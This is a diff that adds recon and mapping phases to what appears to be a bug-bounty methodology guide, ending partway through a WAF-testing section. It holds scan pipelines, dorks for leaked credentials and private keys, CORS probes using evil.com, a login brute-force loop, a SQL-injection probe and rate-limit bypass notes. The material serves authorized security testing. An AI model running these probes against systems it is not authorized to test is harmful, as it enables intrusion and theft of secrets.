@@ -23,90 +23,978 @@ Merged from: bb-methodology + bug-bounty + web2-recon + web2-vuln-classes + secu
 
 ---
 
+# PHASE 0.5: WORKSPACE SETUP & TOOL INSTALLATION
+
+> Run once per environment. All tools are free/open-source.
+
+## Core Tool Installation
+
+```bash
+# === Go tools (install via go install) ===
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+go install -v github.com/projectdiscovery/mapcidr/cmd/mapcidr@latest
+go install -v github.com/projectdiscovery/asnmap/cmd/asnmap@latest
+go install -v github.com/projectdiscovery/shuffledns/cmd/shuffledns@latest
+go install -v github.com/lc/gau/v2/cmd/gau@latest
+go install -v github.com/tomnomnom/waybackurls@latest
+go install -v github.com/tomnomnom/assetfinder@latest
+go install -v github.com/tomnomnom/qsreplace@latest
+go install -v github.com/tomnomnom/unfurl@latest
+go install -v github.com/tomnomnom/gron@latest
+go install -v github.com/ffuf/ffuf/v2@latest
+go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+go install -v github.com/hakluke/hakrawler@latest
+go install -v github.com/haccer/subjack@latest
+go install -v github.com/sensepost/gowitness@latest
+go install -v github.com/d3mondev/puredns/v2@latest
+go install -v github.com/Josue87/gotld@latest
+go install -v github.com/incizex/ghauri@latest
+
+# === Python tools ===
+pip install arjun paramspider uro bbot cloud_enum dnsgen fav-up mantrapy
+pip install linkfinder trufflehog3 jsbeautifier inql graphw00f
+pip install git+https://github.com/blechschmidt/massdns.git
+pip install git+https://github.com/infosec-au/altdns.git
+
+# === Special tools ===
+# jwt_tool
+git clone https://github.com/ticarpi/jwt_tool /opt/jwt_tool
+# Gopherus (SSRF gopher payload generator)
+git clone https://github.com/tarunkant/Gopherus /opt/gopherus
+# SSRF Proxy
+git clone https://github.com/bcoles/ssrf_proxy /opt/ssrf_proxy
+# byp4xx (403 bypass)
+git clone https://github.com/lobuhi/byp4xx /opt/byp4xx
+# nomore403
+git clone https://github.com/devploit/nomore403 /opt/nomore403
+# CloudBrute
+git clone https://github.com/0xsha/CloudBrute /opt/cloudbrute
+```
+
+## Wordlists Setup
+
+```bash
+# Seclists (essential)
+git clone https://github.com/danielmiessler/SecLists /opt/seclists
+
+# Assetnote wordlists
+wget -r -np https://wordlists-cdn.assetnote.io/data/ -P /opt/assetnote-wordlists
+
+# Nuclei templates
+nuclei -update-templates
+git clone https://github.com/projectdiscovery/nuclei-templates /opt/nuclei-templates
+
+# Custom Resolvers
+wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -O /opt/resolvers.txt
+```
+
+## Environment Variables
+```bash
+# Add to ~/.bashrc or ~/.zshrc:
+export GITHUB_TOKEN="ghp_your_token"       # For GitHub subdomain discovery
+export CHAOS_API_KEY="your_chaos_key"       # For ProjectDiscovery Chaos
+export SHODAN_API_KEY="your_shodan_key"    # For Shodan integration
+export CENSYS_API_ID="your_id"             # For Censys
+export CENSYS_API_SECRET="your_secret"
+export VT_API_KEY="your_vt_key"            # For VirusTotal
+export GITHUB_USERNAME="your_username"     # For git operations
+
+# Add PATH for Go tools
+export PATH=$PATH:$(go env GOPATH)/bin
+```
+
+## Quick Health Check
+```bash
+# Verify all core tools are installed:
+for tool in subfinder httpx nuclei naabu dnsx gau waybackurls assetfinder ffuf katana; do
+  which $tool >/dev/null 2>&1 && echo "✓ $tool" || echo "✗ $tool MISSING"
+done
+```
+
+## Directory Structure Convention
+```
+~/bugbounty/
+├── targets/              # Per-target workspace
+│   └── target.com/
+│       ├── recon/        # Subdomains, URLs, screenshots
+│       ├── exploits/     # PoC scripts
+│       ├── notes/        # Observations, flows
+│       └── reports/      # Final submissions
+├── wordlists/            # Symlink to /opt/seclists etc.
+├── scripts/              # Custom automation
+└── tools/                # Git-cloned tools
+```
+
+---
+
 # PHASE 1: RECON
 
-## Subdomain Enumeration
+> "The hunter who maps the widest attack surface finds the deepest bugs."
+
+## Full Recon One-Shot Pipeline
+
 ```
-subfinder -d target.com -all | dnsx -silent | httpx -silent -status-code -tech-detect -title -o live.txt
-amass enum -passive -d target.com
-chaos -d target.com -silent
-puredns bruteforce subdomains-top1million-5000.txt target.com
+#!/bin/bash
+TARGET=$1
+OUTPUT="recon/$TARGET"
+mkdir -p "$OUTPUT"/{subs,urls,js,ports,tech,cloud,screenshots,nuclei,params}
+
+echo "[*] Full recon for $TARGET starting at $(date)"
+
+# Phase 1: Passive Subdomain Enum (parallel)
+subfinder -d "$TARGET" -all -recursive -silent -o "$OUTPUT/subs/subfinder.txt"
+assetfinder --subs-only "$TARGET" >> "$OUTPUT/subs/passive_raw.txt"
+amass enum -passive -d "$TARGET" -o "$OUTPUT/subs/amass.txt" 2>/dev/null
+findomain -t "$TARGET" -q -u "$OUTPUT/subs/findomain.txt"
+curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew "$OUTPUT/subs/crtsh.txt"
+
+# GitHub subdomain search
+github-subdomains -d "$TARGET" -t $GITHUB_TOKEN -o "$OUTPUT/subs/github.txt" 2>/dev/null
+
+# Phase 2: Deduplicate & resolve
+cat "$OUTPUT/subs/"*.txt | sort -u > "$OUTPUT/subs/all_raw.txt"
+puredns resolve "$OUTPUT/subs/all_raw.txt" -r ~/resolvers.txt -o "$OUTPUT/subs/resolved.txt" -q
+
+# Phase 3: HTTP probing (broad port range)
+httpx -l "$OUTPUT/subs/resolved.txt" \
+  -ports 80,443,8080,8443,8000,8888,3000,5000,9000,9090,9443,7443 \
+  -title -status-code -tech-detect -follow-redirects -silent \
+  -o "$OUTPUT/live_apps.txt"
+
+grep -oP 'https?://\S+' "$OUTPUT/live_apps.txt" | sort -u > "$OUTPUT/live_urls.txt"
+
+echo "[*] Live hosts: $(wc -l < "$OUTPUT/live_urls.txt")"
+echo "[*] Recon complete: $(date)"
 ```
 
-## URL Collection
+## Passive Subdomain Enumeration
+
+### Tools & Sources
 ```
-gau --subs target.com | uro > archive-urls.txt
-waybackurls target.com | uro >> archive-urls.txt
-katana -u https://target.com -d 3 -jc -kf -aff -o crawled-urls.txt
+# Subfinder (best passive, 30+ sources)
+subfinder -d target.com -all -recursive -silent -o subs.txt
+
+# Amass (OWASP, deep but slow)
+amass enum -passive -d target.com -o amass.txt
+
+# CRT.sh (Certificate Transparency)
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
+  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crtsh.txt
+
+# Findomain (fast, certificate-based)
+findomain -t target.com -q -u findomain.txt
+
+# Assetfinder (quick, multiple sources)
+assetfinder --subs-only target.com > assetfinder.txt
+
+# Chaos (ProjectDiscovery's dataset)
+chaos -d target.com -silent -o chaos.txt
+
+# GitHub subdomains (requires token)
+github-subdomains -d target.com -t $GITHUB_TOKEN -o github.txt
+
+# SecurityTrails API (if available)
+curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" \
+  -H "APIKEY: $ST_KEY" | jq -r '.subdomains[]' | sed 's/$/.target.com/' > strails.txt
 ```
 
-## JS Analysis
+### Combine, Dedup & Resolve
 ```
-jsluice urls target.com-js/*.js > js-urls.txt
-jsluice secrets target.com-js/*.js > js-secrets.txt
+cat *subs*.txt | sort -u | anew all_subs.txt
+
+# Resolve with dnsx
+dnsx -l all_subs.txt -a -resp -o resolved.txt
+
+# Or resolve with puredns
+puredns resolve all_subs.txt -r ~/resolvers.txt -o resolved.txt -q
+```
+
+## Active Subdomain Enumeration
+
+### DNS Brute Force
+```
+# puredns (fast, wildcard filtering)
+puredns bruteforce ~/wordlists/subdomains-top1million-5000.txt target.com \
+  -r ~/resolvers.txt -w brute_subs.txt
+
+# shuffledns (alternative)
+shuffledns -d target.com -w ~/wordlists/all.txt -r ~/resolvers.txt -o shuffled.txt
+
+# massdns (raw speed)
+massdns -r ~/resolvers.txt -t A -o S -w massdns.txt subdomains.txt
+```
+
+### Permutation & Alteration
+```
+# AltDNS: generate permutations of found subdomains
+altdns -i all_subs.txt -o data.json -w ~/words/permutations.txt -r -s alt_output.txt
+
+# dnsgen (similar, Python-based)
+cat all_subs.txt | dnsgen -w ~/words/dnsgen.txt | dnsx -silent -o perms_resolved.txt
+```
+
+## HTTP Probing & Live Host Discovery
+
+### httpx (comprehensive)
+```
+# With technology detection, title, status
+httpx -l resolved.txt -ports 80,443,8080,8443,8000,8888,3000,5000,9000 \
+  -title -status-code -tech-detect -follow-redirects -silent \
+  -o live_apps.txt
+
+# Filter by status
+httpx -l resolved.txt -mc 200,201,301,302,403,401 -o interesting.txt
+
+# Screenshot all live hosts
+httpx -l resolved.txt -screenshot -srd screenshots/
+```
+
+### Web Screenshot Analysis
+```
+gowitness file -f live_urls.txt --destination screenshots/
+aquatone -list live_urls.txt -out aquatone_output/
+```
+
+## URL Collection & Crawling
+
+### Historical/Archived URLs
+```
+# GAU (getallurls) — multiple sources
+gau --subs target.com | uro > gau_urls.txt
+
+# Wayback Machine
+waybackurls target.com | uro >> archive_urls.txt
+
+# Wayback Machine diff (find new endpoints)
+waybackdiff: https://web.archive.org/web/20250101000000*/target.com/*
+```
+
+### Active Crawling
+```
+# Katana (fast, JS-aware)
+katana -u https://target.com -d 3 -jc -kf -aff -o crawled_urls.txt
+katana -list live_urls.txt -d 2 -jc -kf -aff -o all_crawled.txt
+
+# Hakrawler (lightweight)
+hakrawler -url https://target.com -depth 3 -plain | uro > hakrawler.txt
+
+# ParamSpider (parameter discovery)
+paramspider -d target.com -o param_data.txt
+```
+
+### Filter & Organize URLs
+```
+# Categorize by extension
+cat all_urls.txt | grep "\.js" > js_files.txt
+cat all_urls.txt | grep -E "\.(json|xml|yaml|config)" > api_files.txt
+cat all_urls.txt | grep -E "(api/|v1/|v2/|graphql)" > api_endpoints.txt
+cat all_urls.txt | grep -E "(admin|dashboard|config|debug|internal)" > sensitive_paths.txt
+
+# Extract parameters from URLs
+cat all_urls.txt | grep -E "\?." | qsreplace -a | sort -u > params.txt
+```
+
+## JS Analysis & Secret Discovery
+
+### Automated JS Analysis
+```
+# jsluice (extract URLs + secrets)
+jsluice urls target.com-js/*.js > js_urls.txt
+jsluice secrets target.com-js/*.js > js_secrets.txt
+jsluice nodes target.com-js/*.js > js_usages.txt
+
+# LinkFinder (endpoint extraction)
+linkfinder -i https://target.com/script.js -o cli
+
+# Mantra (full JS attack surface)
 mantra target.com-js/ -o mantra-output/
+
+# Secret scanning
 trufflehog filesystem --only-verified target.com-js/
+nuclei -t ~/nuclei-templates/js/ -l js_files.txt -o js_vulns.txt
 ```
 
-## Port Scanning
+### Manual JS Review Patterns
 ```
+# grep patterns for secrets
+grep -rE '(api[_-]?key|API[_-]?KEY|secret|token|auth|password|access[_-]?key)' *.js
+
+# grep patterns for endpoints
+grep -rE '(api/|v1/|/graphql|/internal|/admin|/debug|/swagger|/health)' *.js
+
+# grep patterns for postMessage
+grep -rE '(postMessage|onmessage|addEventListener.*message)' *.js
+
+# grep patterns for dangerous functions
+grep -rE '(eval\(|innerHTML|document\.write|setTimeout.*string|setInterval.*string)' *.js
+
+# grep patterns for Firebase/GCP
+grep -rE '(firebaseio|firebase\.app|googleapis|storage\.googleapis|s3\.amazonaws)' *.js
+
+# grep for JWT tokens
+grep -rE '(eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)' *.js
+```
+
+### JS File Monitoring (Continuous)
+```
+# Compare current JS vs archived versions
+waybackurls target.com | grep "\.js" | sort -u > current_js.txt
+# Then use: jsdiff -c current_js.txt -a archive_js.txt
+
+# Monitor JS for changes over time
+github-endpoints -d target.com -t $GITHUB_TOKEN | grep "\.js"
+```
+
+## Favicon Hash Analysis
+
+```
+# Extract favicon hash with Python
+python3 -c "import mmh3, requests, base64, codecs
+r = requests.get('https://target.com/favicon.ico')
+favicon = codecs.encode(r.content, 'base64')
+hash = mmh3.hash(favicon)
+print(f'favicon hash: {hash}')"
+
+# Search Shodan by favicon hash
+# https://www.shodan.io/search?query=http.favicon.hash:FAVICON_HASH
+
+# Use fav-up tool
+python3 favUp.py -d target.com -o fav_results.txt
+
+# Use Shodan CLI
+shodan search "http.favicon.hash:FAVICON_HASH"
+```
+
+## ASN & IP Space Discovery
+
+```
+# asnmap — find ASN and IP ranges
+asnmap -d target.com
+asnmap -a AS12345
+
+# Find all IP ranges belonging to the target
+whois -h whois.radb.net "!gAS12345" | grep -Eo "([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+)"
+
+# Scan all IP in range for web services
+mapcidr -a "192.0.2.0/24" -silent | httpx -silent -o live_range.txt
+
+# Reverse DNS lookup on IP ranges
+dnsx -a -resp-only -ptr -silent IP_RANGE
+```
+
+## Port Scanning & Service Discovery
+
+```
+# naabu — fast port scan
 naabu -host target.com -top-ports 1000 -o ports.txt
-rustscan -a target.com -- -sV -sC
+naabu -list resolved.txt -p 1-65535 -rate 1000 -o full_ports.txt
+
+# rustscan — detailed service scan
+rustscan -a target.com -- -sV -sC -oN rustscan_output.txt
+
+# nmap — targeted service scan
+nmap -sV -sC -p 80,443,8080,8443 target.com -oA nmap_web
+
+# scan for common internal ports on discovered hosts
+nmap -p 22,3389,3306,5432,6379,9200,27017,11211 target.com -oA nmap_internal
 ```
 
-## Tech Detection & CVEs
+## Technology Detection & CVE Scanning
+
 ```
-nuclei -u https://target.com -tags cve,tech,exposure -o nuclei-cve.txt
-nuclei -l live.txt -tags takeover -o nuclei-takeover.txt
+# Nuclei — general CVE + tech scan
+nuclei -u https://target.com -tags cve,tech,exposure -o nuclei_cve.txt
+nuclei -l live_urls.txt -t ~/nuclei-templates/ -o nuclei_all.txt
+
+# Nuclei — targeted scans
+nuclei -l live_urls.txt -tags takeover -o nuclei_takeover.txt
+nuclei -l live_urls.txt -tags misconfig -o nuclei_misconfig.txt
+nuclei -l live_urls.txt -tags exposure -o nuclei_exposure.txt
+
+# WAF detection
 wafw00f https://target.com
+
+# WhatWeb (deep tech fingerprinting)
+whatweb https://target.com -v
+whatweb -l live_urls.txt --log-verbose=tech_report.txt
 ```
 
-## Google Dorks
+## Google Dorking
+
 ```
-site:target.com intitle:"index of" site:target.com inurl:api
-site:target.com ext:pdf | ext:docx | ext:xlsx
-site:target.com inurl:admin | inurl:config | inurl:debug
-site:target.com "X-API-Key" | "api_key" | "secret"
-site:target.com "s3.amazonaws.com" | "storage.googleapis.com"
+# Basic dorks
+site:target.com intitle:"index of" inurl:admin
+site:target.com inurl:api | inurl:rest | inurl:graphql
+site:target.com ext:pdf | ext:docx | ext:xlsx | ext:sql | ext:db
+site:target.com inurl:config | inurl:env | inurl:debug | inurl:swagger
+site:target.com "X-API-Key" | "api_key" | "secret" | "password"
+site:target.com "s3.amazonaws.com" | "storage.googleapis.com" | "blob.core.windows.net"
+site:target.com inurl:php? | inurl:asp? | inurl:jsp? inurl:id=
+site:target.com intitle:"phpinfo" | intitle:"phpmyadmin"
+site:target.com inurl:.git | inurl:.svn | inurl:.aws
+
+# GitHub dorking
+org:target.com "api_key" | "aws_secret" | "password" | "token"
+org:target.com filename:.env | filename:config.json | filename:credentials
+org:target.com "BEGIN RSA PRIVATE KEY" | "BEGIN DSA PRIVATE KEY"
 ```
 
-## Cloud Assets
+## Cloud Asset Discovery
+
 ```
-s3scanner -bucket-list target-buckets.txt
-Check Firebase: https://target.firebaseio.com/.json
+# AWS S3 buckets
+s3scanner -bucket-list target_buckets.txt
+cloud_enum -k target.com -l cloud_output.txt
+
+# GCP buckets
+GCPBucketBrute -b target -d gcp_results.txt
+
+# Azure Blob storage
+MicroBurst -d target.com -o azure_results.txt
+
+# Generic cloud bruteforce
+CloudBrute -d target.com -k target -c config.yaml
+
+# Firebase
+curl -s "https://target.firebaseio.com/.json"
+curl -s "https://target-default-rtdb.firebaseio.com/.json"
+
+# DigitalOcean Spaces
+curl -s "https://target.nyc3.digitaloceanspaces.com"
+```
+
+## Continuous Recon (Cron Setup)
+
+```
+# crontab -e — run daily
+0 6 * * * /home/user/scripts/recon.sh target.com
+
+# Monitor for new subdomains (diff approach)
+cat subs_today.txt | anew subs_yesterday.txt > new_subs.txt
+# If new_subs.txt is not empty → investigate
+
+# Monitor for new URLs
+cat urls_today.txt | anew urls_yesterday.txt > new_urls.txt
+
+# Use ElastAlert / Slack webhook for notifications
+# on new subs, new URLs, new JS files
+
+# Tools for continuous recon
+# - Subdomain Center (Visualize new subdomains)
+# - HTTP Probing every 24h
+# - Nuclei continuous scan
+# - Change detection on JS files
+```
+
+## Technology-Specific Recon
+
+### WordPress
+```
+wpscan --url https://target.com --enumerate vp,vt,u,ap,at
+curl -s "https://target.com/wp-json/wp/v2/users" | jq '.[].slug'
+curl -s "https://target.com/?author=1" -I | grep location
+nuclei -u https://target.com -tags wordpress
+```
+
+### Rails
+```
+# routes, assets, environment
+curl -s "https://target.com/rails/info/routes"  # if in development
+curl -s "https://target.com/rails/info/properties"
+grep -r "config/routes.rb"  # from source if available
+```
+
+### Django
+```
+# admin, static files, settings
+curl -s "https://target.com/admin/login"  # default admin
+curl -s "https://target.com/static/admin/css/base.css"
+nuclei -u https://target.com -tags django
+```
+
+### ASP.NET
+```
+curl -s "https://target.com/Web.config" | head -50
+curl -s "https://target.com/trace.axd"
+curl -s "https://target.com/Elmah.axd"
+```
+
+## Virtual Host Enumeration
+
+```
+# ffuf with Host header fuzzing
+ffuf -w ~/wordlists/vhost.txt -u https://target.com \
+  -H "Host: FUZZ.target.com" -fs 1234
+
+# hosthunter (automated)
+python3 hosthunter.py target.com
+
+# vhost discovery via certificates
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
+  jq -r '.[].name_value' | grep "@" | sort -u
+
+# vhost brute force with shuffledns
+shuffledns -d target.com -list <(cat subdomains.txt) -r ~/resolvers.txt
+```
+
+## User-Agent Specific Crawling
+
+```
+# Different UAs reveal different content
+# Mobile: bypass desktop-only restrictions
+katana -u https://target.com -H "User-Agent: Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
+
+# Googlebot: sometimes cached/SEO-indexed content is different
+katana -u https://target.com -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
+
+# Archive bot: Wayback Machine may have crawled hidden content
+# CloudFront/CloudFlare: different origins per UA
+
+ffuf -w ~/wordlists/user-agents.txt -u https://target.com/FUZZ -mc all -fs 0
 ```
 
 ---
 
 # PHASE 2: MAPPING & ANALYSIS
 
-## Endpoint Mapping
-- Map all endpoints via Burp sitemap + JS analysis
-- Identify auth model: cookie / JWT / OAuth / SAML / API key
-- Find business-critical flows: payment, registration, password reset, 2FA, data export, OAuth login
+> "You can't hack what you don't understand. Map everything before touching anything."
 
-## Hidden Parameters
+## Endpoint Discovery & Mapping
+
+### API Documentation Discovery
 ```
-arjun -u https://target.com/api/endpoint
-paramspider -d target.com
+# Swagger/OpenAPI — check all common paths
+for path in \
+  /swagger /swagger-ui /swagger-ui.html /swagger.json /swagger.yaml \
+  /api-docs /api-docs/swagger.json /api-docs/swagger.yaml \
+  /openapi /openapi.json /openapi.yaml \
+  /v1/swagger /v2/swagger /v3/swagger \
+  /api/swagger.json /api/openapi.json \
+  /docs /redoc /api/redoc /internal/swagger /api/v1/swagger.json; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
+  [ "$code" != "404" ] && echo "$code $path"
+done
+
+# Parse OpenAPI spec for all endpoints
+curl -s https://target.com/openapi.json | \
+  python3 -c "import json,sys; spec=json.load(sys.stdin);
+base=spec.get('servers',[{'url':''}])[0].get('url','')
+for path in spec.get('paths',{}).keys(): print(f'{base}{path}')"
 ```
 
-## JS Taint Analysis
-- Download all JS files → search for: `api/` `admin/` `internal` `debug` `config` `secret` `token` `key`
-- Look for hardcoded API keys, AWS keys, JWT secrets
-- Check for `postMessage` listeners → DOM-based attacks
-
-## CORS Check
+### GraphQL Discovery
 ```
-Origin: https://evil.com → Access-Control-Allow-Origin: https://evil.com
-Origin: null → Access-Control-Allow-Origin: null
-Origin: https://target.evil.com → Access-Control-Allow-Origin: https://target.evil.com
+# Common GraphQL paths
+for path in /graphql /graphiql /api/graphql /v1/graphql /gql /graph /console; do
+  curl -s -o /dev/null -w "%{http_code} $path\n" -X POST \
+    -H "Content-Type: application/json" \
+    -d '{"query":"{__typename}"}' "https://target.com$path" | grep -v 404
+done
+
+# Test introspection
+curl -s -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name } } }"}' | jq '.'
+
+# Introspection bypass (some block __schema but not __type)
+curl -s -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __type(name: \"Query\") { fields { name } } }"}' | jq '.'
+
+# GraphQL fingerprinting
+python3 graphw00f.py -d -t https://target.com/graphql
 ```
 
-## CSP Check
-- `script-src 'unsafe-inline'` → XSS possible
-- `script-src 'unsafe-eval'` → DOM XSS possible
-- CDN whitelist → script injection via CDN-hosted libraries
+### Robots.txt, Sitemap & Well-Known
+```
+# robots.txt — find disallowed paths
+curl -s "https://target.com/robots.txt"
+
+# sitemap.xml — find all indexed pages
+curl -s "https://target.com/sitemap.xml" | grep -oP '<loc>\K[^<]+'
+
+# .well-known — find security.txt, openid-configuration
+curl -s "https://target.com/.well-known/security.txt"
+curl -s "https://target.com/.well-known/openid-configuration" | jq '.'
+curl -s "https://target.com/.well-known/assetlinks.json"
+```
+
+## Auth Model Analysis
+
+### Identify Auth Type
+```
+# Cookie-based auth
+Check: Set-Cookie header, session cookie name (PHPSESSID, JSESSIONID, ASP.NET_SessionId)
+Test: Replay requests with cookie → access protected resources
+
+# JWT-based auth
+Check: Authorization: Bearer eyJ...
+Test: jwt_tool analysis, alg confusion, none algorithm
+Pattern: eyJ = base64 encoded JSON header
+
+# OAuth 2.0 / OIDC
+Check: /authorize, /token, /oauth endpoints
+Test: redirect_uri theft, state parameter CSRF, code injection
+Pattern: ?client_id= &response_type=code &redirect_uri=
+
+# SAML
+Check: SAMLResponse POST parameters, RelayState
+Test: Signature stripping, XML comment injection, XSW
+Pattern: <saml:Assertion> XML blocks in HTTP responses
+
+# API Keys
+Check: X-API-Key header, api_key parameter, ?key= in URLs
+Test: Key leakage in JS/Git, rate limit bypass, permission escalation
+```
+
+### OAuth Flow Mapping
+```
+# Map all OAuth endpoints
+1. Find all "Login with Google/GitHub/Facebook/Apple" buttons
+2. Capture the full OAuth flow:
+   - /authorize request (client_id, scope, redirect_uri, state)
+   - Authorization code in callback URL
+   - /token exchange request
+   - Access token response
+3. Test each parameter for tampering
+4. Test the complete flow for:
+   - CSRF via missing state parameter
+   - Open redirect via redirect_uri
+   - Code injection via referer header
+   - Token leakage via referer
+   - PKCE downgrade
+```
+
+## Business-Critical Flow Identification
+
+### Priority Flow List
+```
+Priority 1 (ALWAYS test first):
+  - Payment/checkout flows (discount, coupon, refund, free trials)
+  - Account registration → email verification
+  - Password reset flow
+  - 2FA/MFA setup and verification
+  - Privilege escalation (user → admin)
+
+Priority 2 (Test after P1):
+  - Data export/download (CSV, PDF, JSON exports)
+  - File upload/avatar/profile picture
+  - OAuth/Social login flows
+  - Webhook configuration
+  - API key generation
+
+Priority 3 (If time permits):
+  - Support/ticket system
+  - User search/find friends
+  - Notification/settings
+  - Legacy/API v1 endpoints
+```
+
+### Flow Mapping Methodology
+```
+For each critical flow, answer:
+1. What inputs does the user control?
+2. What auth checks are present at each step?
+3. What data is returned at each step?
+4. Can steps be skipped/reordered?
+5. Can the flow be replayed (race condition)?
+6. What happens on error/timeout?
+7. Can one user's flow affect another user's data?
+
+Document the full request-response chain for every flow:
+   Step 1: POST /checkout → redirects to /payment
+   Step 2: POST /payment → returns transaction token
+   Step 3: POST /confirm with token → completes order
+```
+
+## Hidden Parameter Discovery
+
+```
+# Arjun (multi-threaded, large wordlist)
+arjun -u https://target.com/api/endpoint --get -o arjun_get.txt
+arjun -u https://target.com/api/endpoint --post -o arjun_post.txt
+arjun -u https://target.com/api/endpoint --headers -o arjun_headers.txt
+
+# ParamSpider (from Wayback URLs)
+paramspider -d target.com -o param_data.txt
+
+# x8 (performance-oriented)
+x8 -u https://target.com/api/endpoint --wordlist ~/words/params.txt
+
+# BFAC (backdoor file check)
+bfac --url https://target.com --level 2
+
+# Custom parameter guessing based on business logic
+# Example: For a search API, try: sort, order, limit, offset, page, filter
+# Example: For a user API, try: user_id, uid, id, profile_id, account_id
+# Example: For payment, try: amount, price, discount, coupon, currency
+```
+
+## Deep JS Taint Analysis
+
+### Automated Analysis
+```
+# Collect all JS → download
+katana -u https://target.com -jc -kf -aff | grep "\.js" | sort -u > js_files.txt
+wget -i js_files.txt -P target.com-js/
+
+# Run all analysis tools in parallel
+jsluice urls target.com-js/*.js > js_extracted_urls.txt
+jsluice secrets target.com-js/*.js > js_secrets.txt
+jsluice nodes target.com-js/*.js > js_usage_graph.txt
+mantra target.com-js/ -o mantra-results/
+trufflehog filesystem --only-verified target.com-js/ > truffle_results.txt
+
+# Search for API endpoints in JS
+grep -rohE '["'\''][a-zA-Z0-9_/-]*(api|v[0-9]+|graphql|rest|internal|admin|private|secret)[a-zA-Z0-9_/-]*["'\'']' target.com-js/ | sort -u > js_api_endpoints.txt
+
+# Search for hardcoded tokens/keys
+grep -rohE '["'\''][A-Za-z0-9_\-=]{20,}["'\'']' target.com-js/ | sort -u > js_potential_tokens.txt
+```
+
+### Manual Review Patterns
+```
+// postMessage → DOM-based attacks
+window.addEventListener('message', function(e) { ... })
+// Is origin checked? If not → data injection
+
+// eval with dynamic data → XSS
+eval(response.data)
+// JSON.parse with data from URL → DOM XSS
+
+// innerHTML with unsanitized data
+document.getElementById('result').innerHTML = data
+
+// URL construction with user input
+window.location = userControlledUrl
+
+// Dynamic script loading
+var script = document.createElement('script');
+script.src = someVar + '.js';
+```
+
+## CORS Misconfiguration Check
+
+```
+# Basic origin reflection
+curl -s -D- https://target.com/api/endpoint \
+  -H "Origin: https://evil.com" | grep -i "Access-Control"
+
+# Null origin (sandboxed iframes)
+curl -s -D- https://target.com/api/endpoint \
+  -H "Origin: null" | grep -i "Access-Control"
+
+# Subdomain prefix (cloudfront etc. bypass)
+curl -s -D- https://target.com/api/endpoint \
+  -H "Origin: https://target.com.evil.com" | grep -i "Access-Control"
+
+# Any origin with credentials
+curl -s -D- https://target.com/api/endpoint \
+  -H "Origin: https://evil.com" \
+  -H "Authorization: Bearer test" 2>/dev/null | grep -i "Access-Control"
+
+# Preflight OPTIONS check
+curl -s -X OPTIONS https://target.com/api/endpoint \
+  -H "Origin: https://evil.com" \
+  -H "Access-Control-Request-Method: GET" -D- | grep -i "Access-Control"
+```
+
+## CSP Analysis
+
+```
+# Extract CSP from headers
+curl -s -D- https://target.com | grep -i "content-security-policy"
+
+# Weak CSP patterns to look for:
+# 'unsafe-inline' on script-src → XSS exploitation
+# 'unsafe-eval' on script-src → DOM XSS with eval()
+# CDN whitelist: https://cdn.example.com → script injection if CDN hosts user content
+# 'self' with JSONP endpoints → JSONP callback XSS bypass
+# 'strict-dynamic' → trust propagation bypass
+# base-uri not set → base tag injection
+# form-action not set → form jacking
+# Report-URI/Report-To → data exfiltration channel
+
+# Evaluate CSP
+curl -s https://target.com | \
+  python3 -c "
+import sys, re
+html = sys.stdin.read()
+match = re.search(r'content-security-policy[:\s]+(.+?)[\";]', html, re.I)
+if match: print(match.group(1))
+"
+
+# Use CSP evaluator (Google)
+# https://csp-evaluator.withgoogle.com
+```
+
+## WebSocket Discovery
+
+```
+# Try common WebSocket endpoints
+for path in /ws /wss /websocket /socket /socket.io /ws/v1 /ws/v2; do
+  curl -s -o /dev/null -w "%{http_code} $path\n" \
+    -H "Upgrade: websocket" -H "Connection: Upgrade" \
+    "https://target.com$path" | grep -v 404
+done
+
+# Check for Socket.IO
+curl -s "https://target.com/socket.io/?EIO=4&transport=polling"
+
+# Look for WebSocket connections in JS
+grep -rohE '(new WebSocket|wss?://[^"'\'' >)]+)' target.com-js/ | sort -u
+```
+
+## Session & Auth Analysis
+
+```
+# Session cookie analysis
+1. Check cookie flags:
+   - HttpOnly → prevents JS access (good)
+   - Secure → sent over HTTPS only (good)
+   - SameSite → CSRF protection level (Strict > Lax > None)
+   - Path → scope of cookie
+   - Domain → scope of cookie
+
+2. Session predictability:
+   - Login 3x → check if session tokens are predictable
+   - Base64 decode session → check for hidden data
+   - Change 1 char → check if still valid
+
+3. Session fixation:
+   - Set session cookie BEFORE login → check if same after login
+   - Check if session ID regenerates on auth
+
+4. Auth pattern tests:
+   - /api/v2/user → check if /api/v1/user exists (weaker auth)
+   - /api/user → check if /api/admin/user exists
+   - /api/user/ → trailing slash changes routing
+   - /api/user/me → check if /api/user/1 also works
+```
+
+## Rate Limit Discovery
+
+```
+# Test rate limits on auth endpoints
+for i in {1..100}; do
+  curl -s -o /dev/null -w "%{http_code} " \
+    -X POST https://target.com/login \
+    -d "user=test$i&pass=wrong"
+done
+
+# Look for rate limiting headers:
+# X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset
+# Retry-After
+# 429 Too Many Requests
+
+# Rate limit gaps to check:
+# - Bypass via X-Forwarded-For header
+# - Bypass via cookie reset
+# - Bypass via HTTP method change
+# - Bypass via IP rotation (IPv6)
+# - Check if rate limit resets per endpoint vs globally
+```
+
+## WAF Fingerprinting & Bypass Strategy
+
+```
+# WAF detection
+wafw00f https://target.com -a
+
+# Manual WAF tests (false positive → info leak)
+curl -s "https://target.com/?id=1' OR '1'='1" -D- | head
